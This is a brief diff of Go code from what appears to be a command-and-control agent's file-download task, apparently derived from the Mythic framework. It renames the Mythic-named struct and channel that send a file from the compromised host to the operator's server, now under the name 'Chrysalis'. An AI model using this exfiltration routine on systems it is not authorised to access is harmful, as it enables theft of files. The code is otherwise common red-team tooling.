@@ -35,7 +35,7 @@ func Run(task structs.Task) {
 		task.Job.SendResponses <- errResponse
 		return
 	}
-	downloadMsg := structs.SendFileToMythicStruct{}
+	downloadMsg := structs.SendFileToChrysalisStruct{}
 	downloadMsg.Task = &task
 	downloadMsg.IsScreenshot = false
 	downloadMsg.SendUserStatusUpdates = true
@@ -43,7 +43,7 @@ func Run(task structs.Task) {
 	downloadMsg.FileName = fi.Name()
 	downloadMsg.FullPath = path
 	downloadMsg.FinishedTransfer = make(chan int)
-	task.Job.SendFileToMythic <- downloadMsg
+	task.Job.SendFileToChrysalis <- downloadMsg
 	// now block this call until we get confirmation that we're done
 	<-downloadMsg.FinishedTransfer
 	if task.DidStop() {
